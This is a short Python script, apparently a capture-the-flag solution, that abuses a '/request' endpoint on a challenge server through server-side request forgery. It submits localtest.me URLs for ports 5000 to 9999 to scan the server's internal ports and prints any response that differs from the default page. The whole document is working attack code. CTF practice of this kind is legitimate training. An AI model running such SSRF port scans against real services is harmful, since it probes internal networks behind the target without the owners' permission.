import requests

URL = "http://web.zh3r0.cf:6969/request"

for port in range(5000, 10000):
	res = requests.post(URL, data={"sub": "sub", "url": f"http://localtest.me:{port}"})
	if "Learn about URL" not in res.text:
		print(port)
		print(res.text)
	else:
		print("failed:", port)
